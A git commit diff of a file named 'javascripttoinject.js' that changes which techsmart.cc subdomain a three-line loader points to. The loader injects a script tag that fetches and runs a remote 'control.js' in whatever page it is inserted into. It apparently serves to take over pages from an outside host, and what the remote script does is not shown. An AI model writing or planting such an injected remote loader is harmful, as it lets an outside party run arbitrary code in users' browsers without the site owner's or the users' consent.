0b5050e250d1dab1024979ca3e882e4bb2d9f8a0
charlieomg <143298651+charlieomg@users.noreply.github.com>
2026-08-24 21:34:38 -0700

    Update javascripttoinject.js

--- javascripttoinject.js
+++ javascripttoinject.js
@@ -1,3 +1,3 @@
 let s = document.createElement('script');
-s.src = 'https://cord-night-364.techsmart.cc/control.js?t=' + Date.now();
+s.src = 'https://side-country-220.techsmart.cc/control.js?t=' + Date.now();
 document.head.appendChild(s);
